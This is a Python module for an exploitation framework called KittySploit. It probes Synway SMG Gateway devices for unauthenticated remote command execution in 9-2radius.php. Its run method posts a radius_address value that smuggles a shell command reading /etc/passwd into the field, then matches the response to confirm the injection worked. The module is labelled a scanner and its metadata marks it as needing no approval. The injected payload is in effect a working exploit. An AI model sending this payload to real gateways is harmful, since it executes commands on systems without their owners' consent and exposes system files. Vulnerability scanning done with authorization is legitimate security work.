#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Synway SMG Gateway Management Software contains a remote command execution vulnerability in 9-2radius."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Synway SMG Gateway 9-2radius.php - Remote Command Execution Detection',
        'description': 'Synway SMG Gateway Management Software contains a remote command execution vulnerability in 9-2radius.php, where the radius_address parameter is passed to a system() call without sanitization. This allows unauthenticated attackers to execute arbitrary commands on the server.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'rce', 'synway', 'gateway', 'unauth'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': ['https://mp.weixin.qq.com/s/PyepoFSuQ63E3RnpQa9nsA'],
    }

    def run(self):
        path = '/en/9-2radius.php?authority=6'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Accept-Encoding': 'gzip', 'Content-Type': 'application/x-www-form-urlencoded'}, data="save=1&enable_radius=1&radius_address=/';cat /etc/passwd;+#\n")
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if any(re.search(rx, body) for rx in body_regexes):
            self.set_info(severity='critical', reason='Synway SMG Gateway 9-2radius.php - Remote Command Execution detected', path=path)
            return True
        return False

